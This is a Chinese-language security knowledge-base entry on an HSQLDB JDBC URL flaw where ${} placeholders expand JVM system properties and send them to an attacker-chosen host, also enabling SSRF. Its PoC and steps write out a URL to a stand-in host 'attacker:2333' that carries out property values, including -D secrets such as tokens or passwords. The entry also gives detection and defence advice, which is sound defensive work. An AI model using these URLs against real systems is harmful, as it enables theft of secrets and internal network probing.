---
id: web-java-component-hsqldb-jdbc-url-property-expansion-exfil
title: HSQLDB JDBC URL 的 ${} 展开：读取 JVM 系统属性并随连接请求外带（SSRF）
type: scenario
domain: web
path: web/java/component
technique: hsqldb-jdbc-url-property-expansion-exfil
aliases:
- HSQLDB ${} 读取系统属性
- jdbc:hsqldb URL 变量展开
- HSQLDB JDBC 信息泄露
- JDBC URL 外带系统属性
- System.getProperty via JDBC URL
tags:
- java
- hsqldb
- jdbc
- information-disclosure
- ssrf
- system-property
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V233
  verified_at: '2026-11-07T09:17:42+08:00'
  notes: 已对照原文与监听日志核对：jdbc:hsqldb:http://...?aaa=${java.version} 被替换为 11.0.22 并随 POST 请求外带，与原文一致；未复跑。
---

## 一句话结论

当攻击者能控制 HSQLDB 的 JDBC URL（HTTP/HTTPS 传输）时，驱动解析 URL 会把 `${name}` 替换为 `System.getProperty(name)` 的返回值，并随连接请求发送到 URL 中的主机，导致任意 JVM 系统属性被读取外带，同时形成对任意地址的 SSRF。

## 原理

- HSQLDB 在解析 JDBC URL 时会循环查找 `${` 与 `}`，取出中间的变量名调用 `System.getProperty(varName)`，把返回值替换回 URL；变量不存在时循环停止。
- 整条 URL 由攻击者控制时，可以把 `${java.version}` 之类的占位符放进 query、路径等位置。使用 HTTP 传输（`jdbc:hsqldb:http://host:port/...`）建立连接时，驱动把替换后的请求发往 URL 指定的主机，攻击者在监听端直接读到属性值（原文实测请求行为 `POST /?aaa=11.0.22`）。
- 这同时具备两种影响：
  1. **信息泄露**：JVM 系统属性中常有版本、安装路径、用户名、工作目录，以及通过 `-Dkey=value` 注入的密钥/令牌/数据库口令等自定义配置；
  2. **SSRF**：请求由目标服务器发起，可指向任意 host:port，用于探测内网或访问仅内网可达的服务。
- 限制：只展开系统属性（不是环境变量）；属性名必须已知且存在；URL 必须能通过驱动解析并成功发起连接（HTTP 传输的响应需符合 HSQLDB 协议，纯 SSRF 探测能力有限，但请求行/参数仍会到达攻击者）。

## 触发条件

- 应用把用户输入直接或拼接后作为 JDBC URL 传给 HSQLDB 驱动（数据源配置、连接测试、JDBC 注入等）。
- classpath 存在 HSQLDB 驱动，攻击者可指定 `jdbc:hsqldb:http://` 形式的目标地址。
- 目标可出网到攻击者监听地址（外带属性），或可访问内网目标（SSRF）。
- 攻击者使用的属性名在目标 JVM 中存在。

## 利用步骤

1. 确认 JDBC URL 可控且目标 classpath 有 HSQLDB 驱动；通过报错信息判断驱动版本与 URL 解析行为。
2. 在攻击者主机监听 HTTP 端口。
3. 提交带占位符的 URL：`jdbc:hsqldb:http://attacker:2333/?aaa=${java.version}`，驱动连接时把属性值拼进请求。
4. 依次替换 `${user.dir}`、`${os.name}`、`${user.name}`、`${java.home}` 或业务自定义 `-D` 键（如 token、密码、密钥路径），收集泄露值。
5. SSRF 场景把 host:port 换成内网地址，观察目标是否发起请求；对无响应端口可通过时序/错误差异判断连通性。

## PoC

最小连接代码（触发点）：

```java
String dbUrl = "jdbc:hsqldb:http://attacker:2333/?aaa=${java.version}";
Connection connection = DriverManager.getConnection(dbUrl, "aaaa", "123456");
```

攻击者监听端收到（原文实测形态）：

```text
POST /?aaa=11.0.22 HTTP/1.1
User-Agent: Java/11.0.22
Host: attacker:2333
Content-Type: application/octet-stream
```

## 变体与关联

- 占位符可放在 URL 的路径、参数名或参数值中；替换后的值原样进入请求。
- 可读取任意系统属性，包括启动参数 `-D` 注入的敏感配置；不能读取环境变量。
- 与 JDBC URL 攻击族关联：[[web-java-deserialization-mysql-jdbc-url-autodeserialize-rce]]（URL 可控 + 恶意数据库服务端）、[[web-java-deserialization-h2-jdbc-init-create-alias-rce]]（H2 INIT 执行 SQL）、[[web-java-component-hsqldb-call-static-method-rce]]（同一驱动的 CALL 静态方法 RCE）。
- 边界：URL 被驱动/主机/端口白名单限制、目标不出网、或传输方式不发起可控请求时，外带与 SSRF 不成立。

## 检测与防御

- 检测：JDBC URL 中出现 `${`/`}` 占位符；应用进程向非常规主机发起携带 Java 版本等系统属性值的 HTTP 请求；HSQLDB 连接日志中出现外部地址。
- 防御：禁止用户控制 JDBC URL 与驱动类；对驱动、主机、端口、协议做白名单；连接前过滤或转义 `${`；限制应用出站访问。
- 加固：不要把密钥、令牌等敏感信息放在 JVM 系统属性中；数据源配置变更需审计与权限控制。
